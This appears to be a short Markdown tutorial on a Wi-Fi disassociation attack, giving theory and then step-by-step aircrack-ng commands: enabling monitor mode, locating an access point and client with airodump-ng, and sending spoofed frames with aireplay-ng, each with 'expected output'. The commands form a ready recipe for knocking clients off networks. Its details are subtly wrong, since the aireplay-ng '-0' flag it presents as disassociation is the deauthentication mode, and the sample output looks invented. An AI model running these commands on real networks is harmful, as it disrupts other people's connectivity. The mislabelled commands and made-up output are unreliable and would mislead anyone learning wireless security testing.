# Disassociation Attack

## Theory
A disassociation attack targets the connection between a client and an AP by sending spoofed disassociation frames. Unlike deauthentication, disassociation is a "soft" disconnection, meaning the client is still authenticated but temporarily disconnected.

This attack can be used to:
- Disrupt network connectivity.
- Force a client to reconnect, potentially capturing sensitive data.

## Tools Required
- `aircrack-ng` suite
- `Wireshark` for traffic analysis
- A wireless adapter capable of monitor mode and packet injection

## Steps

### Step 1: Enable Monitor Mode
Enable monitor mode on your wireless interface.

```bash
sudo airmon-ng start wlan0
```

Expected output:
```
Interface   Chipset         Driver
wlan0       Atheros         ath9k - [phy0]
                (monitor mode enabled on wlan0mon)
```

### Step 2: Capture Traffic
Use `airodump-ng` to identify the target AP and client.

```bash
sudo airodump-ng wlan0mon
```

Expected output:
```
 BSSID              PWR  Beacons  #Data, #/s  CH  MB   ENC  CIPHER  AUTH ESSID
 00:14:6C:7E:40:80  -50      100     50    0   6  54e  WPA2  CCMP    PSK  MyWiFi

 STATION            PWR   Rate   Lost  Frames  Probe
 00:25:9C:CF:1C:9E  -40   36e     0     200   MyWiFi
```

### Step 3: Send Disassociation Frames
Send spoofed disassociation frames to disrupt the connection.

```bash
sudo aireplay-ng -0 10 -a [AP_MAC] -c [CLIENT_MAC] wlan0mon
```

- `-0 10`: Sends 10 disassociation packets.
- `-a [AP_MAC]`: MAC address of the target AP.
- `-c [CLIENT_MAC]`: MAC address of the client.

Expected output:
```
10 disassociation frames sent.
```

### Notes
- Use this attack responsibly and only on authorized networks.
- Monitor the impact using `Wireshark` to confirm disassociation frames are being sent.
